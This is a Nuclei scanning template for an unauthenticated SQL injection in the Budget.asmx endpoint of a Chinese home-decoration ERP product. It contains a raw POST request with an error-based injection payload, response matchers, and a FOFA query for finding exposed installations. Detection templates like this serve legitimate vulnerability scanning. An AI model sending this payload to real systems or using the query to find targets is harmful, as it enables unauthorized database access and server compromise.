http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 在将 nvarchar 值
            - 转换成数据类型 int 时失败
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /WEB_SERVICE/Budget.asmx/getFixedBaseInfo HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          where=1=db_name()&intPageIndex=1&pageSize=20
id: jiazhuangERP-Budget_asmx-sql
info:
    author: Superhero
    description: |-
        fofa: app="装盟科技-家装ERP管理系统"
        装盟科技-家装ERP管理系统 Budget.asmx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 装盟科技-家装ERP管理系统 Budget.asmx SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/WY1yhgb_CkqmSykwKvW8gA
    severity: high
    tags: []
